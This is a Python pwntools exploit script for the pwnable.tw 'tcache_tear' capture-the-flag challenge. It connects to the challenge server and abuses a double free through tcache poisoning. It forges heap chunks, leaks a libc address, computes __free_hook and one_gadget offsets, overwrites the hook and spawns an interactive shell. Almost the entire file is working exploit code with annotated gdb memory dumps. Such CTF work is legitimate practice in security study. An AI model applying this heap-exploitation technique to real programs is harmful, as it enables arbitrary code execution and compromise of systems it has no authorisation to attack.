from pwn import *

def add(option,size,note):
    if(option):
    	p.send("1\n")
    	p.recvuntil(":")
    	p.send(str(size)+"\n")
    	p.recvuntil(":")
    	p.send(note)
    else:
    	p.recvuntil(":")
    	p.send("1\n")
    	p.recvuntil(":")
    	p.send(str(size)+"\n")
    	p.recvuntil(":")
    	p.send(note)

def delete():
	p.recvuntil(":")
	p.send("2\n")

#p=process("./tcache_tear")#,env = {'LD_PRELOAD' : './libc.so'})
p=remote("chall.pwnable.tw", 10207)

p.recvuntil("Name:")
p.send("heeyeon\n")

add(0,0x70,"heeyeon\n")
delete()
delete()
add(0,0x70,p64(0x602550))
add(0,0x70,"heeyeon\n")
"""
gdb-peda$ x/16gx 0x602550
0x602550:	0x0000000000000000	0x0000000000000021
0x602560:	0x0000000000000000	0x0000000000000000
0x602570:	0x0000000000000000	0x0000000000000021
"""
add(0,0x70,p64(0)+p64(0x31)+p64(0)*4+p64(0)+p64(0x20c61))

#######################################################
#pause()
add(0,0x60,"heeyeon\n")
delete()
delete()
add(0,0x60,p64(0x602050))
add(0,0x60,"heeyeon\n")
"""
gdb-peda$ x/16gx 0x602050
0x602050:	0x0000000000000000	0x0000000000000501
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000602060
"""
#pause()
add(0,0x60,p64(0)+p64(0x501)+p64(0)*5+p64(0x602060))
delete()
"""
gdb-peda$ x/16x 0x602050
0x602050:	0x0000000000000000	0x0000000000000501
0x602060:	0x00007f212879bca0	0x00007f212879bca0
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000602060
"""
p.recvuntil(":")
p.send("3\n")
p.recvuntil("Name :")
leak=u64(p.recv(1024)[0:6]+"\x00\x00")
print(hex(leak))
one_gadget=leak-0x7fcec0545ca0+0x7fcec01a9440-0x4f440+0x4f322
free_hook=leak-0x7fcec0545ca0+0x7fcec01a9440-0x4f440+0x3ed8e8
print(hex(one_gadget))
print(hex(free_hook))
pause()
#if give malloc(0x60) and free-> it goes to fastbin(since fastbin has sizecheck it occurs error)
add(1,0x50,"heeyeon\n")
delete()
delete()
add(0,0x50,p64(free_hook))
add(0,0x50,"heeyeon\n")
add(0,0x50,p64(one_gadget))
delete()
p.interactive()
p.close()